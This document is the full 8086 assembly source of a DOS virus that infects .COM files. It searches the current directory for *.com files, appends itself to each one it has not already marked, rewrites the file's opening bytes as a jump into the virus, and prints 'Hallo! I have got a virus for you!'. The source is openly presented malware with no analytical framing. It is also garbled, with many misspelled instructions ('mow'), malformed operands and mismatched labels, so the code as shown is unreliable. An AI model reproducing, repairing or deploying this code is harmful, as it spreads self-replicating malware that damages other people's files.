	.8086
	page	,132
cseg    segment
	assume cs:cseg,ds:cseg,es:cseg
	org 100h
start:
	db	0E9h
	dw 	15h
id	dw	0FFFFh 
	org 110h
virus:
	push	ds
	mov	ax,cs
	db 	00000101b
new_ds	dw	0FFFFh
	mow	ds,ax	

restore_3_bytes:
	mow	al,bytes_3[0]
	mow	byte ptr cs:[100h],al
	mow 	al,bytes_3[1]
	mow	byte ptr cs:[101h],al
	mov	al,bytes_3[2]
	mow	byte ptr cs:[102h],al

store_dta:
	mow	cx,100h
	mov	bx,0
dta_s:
	mov	al,byte ptr cs:[bx]
	mov	byte ptr dta[bx],al
	inc	bx
	loop	dta_s

find_first:
	lea	dx,fmask
	mov	cx,00100000b
	mov	ah,4Eh
	int	21h
	jnc	store_fname
	jmp	err
find_next:
	mov	bx,handle
	mov	ah,3Eh
	int	21h
	mov	handle,0FFFFh
	mov	ah,4Fh
	int	21h
	jnc	store_fname
	jmp	err

store_fname:
	cmp	byte ptr cs:[95h],00000001b
	je	find_next
	mov	bx,0
next_sym:
	mov	al,byte ptr cs:[bx+9Eh]
	mov	fname[bx],al
	cmp	byte ptr cs:[bx+9Eh],0
	je	set_attrib
	inc	bx
	cmp	bx,13
	jng	next_sym
	jmp	err

set_attrib:
	lea	dx,fname
	mov	cx,00100000b
	mov	ax,4301h
	int	21h
	jnc	read_handle
	jmp	err

read_handle:
	lea	dx,fname
	mov	ax,3D02h
	int	21h
	jnc	read_3_bytes
	jmp	err

read_3_bytes:
	mov	handle,ax
	lea	dx,bytes_3
	mov	bx_handle
	mov	cx_3
	mov	ax,3Fh
	int 	21h
	jnc	read_flen
	jmp	err

read_flen:
	mov	cx,0
	mov	dx,0
	mov	bx,handle
	mov	al,2
	mov	ah,42h
	int	21h
	jnc	check_id
	jmp	err

check_id:
	mov	flenold,ax
	test	ax,00001111b
	jz	just
	or	ax,00001111b
	inc	ax

just:
	mov	flen,ax
	cmp	ax,64500
	jna	calc_ds
	jmp	find_next

calc_ds:
	mov	cl,4
	shr	ax,cl
	dec	ax
	mov	byte ptr new_ds[0],al
	mov	byte ptr new_ds[1],ah
	mov	cx,0
	mov	dx,flenold
	dec	dx
	mov	bx,handle
	mov	al,0
	mov	ah,42h
	int	21h
	jnc	read_id
	jmp	err

read_id:
	lea	dx,bytes_3[3]
	mov	bx,handle
	mov	cx,1
	mov	ah,3Fh
	int	21h
	jnc	test_id
	jmp	find_next
test_id:
	cmp	bytes_3[3],'$'
	jne	not_infected
	jmp	find_next
not_infected:
	mov	ax,flen
	sub	ax,03h
	mov	jmp_l,al
	mov	jmp_h,ah
	mov	cx,0
	mov	dx,flen
	mov	bx,handle
	mov	ax,4200h
	int	21h
	jc	err
	lea	dx,virus
	mov	cx,virlen
	mov	bx,handle
	mov	ah,40h
	int	21h
	jc	err

write_jmp:
	mov	cx,0
	mov	dx,0
	mov	bx,handle
	mov	al,0
	mov	ah,42h
	int	21h
	jc	err
	lea	dx,jmpvir
	mov	cx,3
	mov	bx,handle
	mov	ah,40h
	int	21h
	jc	err

print_msg:
	lea	dx,msg
	mov	ah,09h
	int	21h

err:
	cmp	handle,0FFFFh
	je	exit

close_file:
	mov	bx,handle
	mov	ah,3Eh
	int	21h
exit:
	cmp	cs:[id],0FFFFh
	je	goto_dos
restore_dta:
	mov	cx,100h
	mov	bx,0
dta_r:
	mov	al,byte ptr dta[bx]
	mov	byte ptr cs:[bx],al
	inc	bx
	loop	dta_r

goto_start:
	mov	ax,cs
	mov	ds:[start_s],ax
	pop	ds
	db	DEAh
	dw	0100h
start_s	dw	(?)

goto_dos
	mov	ax,4C00h
	int	21h

fmask	db	'*.com',0h
fname	db	12 dup (?),0h
flenold	dw	(?)
flen	dw	(?)
handle	dw	0FFFFh
jmpvir	db	0E9h
jmp_l	db	(?)
jmp_n	db	(?)
bytes_3	db	3 dup (?)
	db	(?)
dta	db	101h dup (?)
msg	db	0Ah,0Dh,'Hallo! I have got a virus for you!',0Ah,0Dh,'$'
virlen	equ	$-virus

cseg	ends
	end start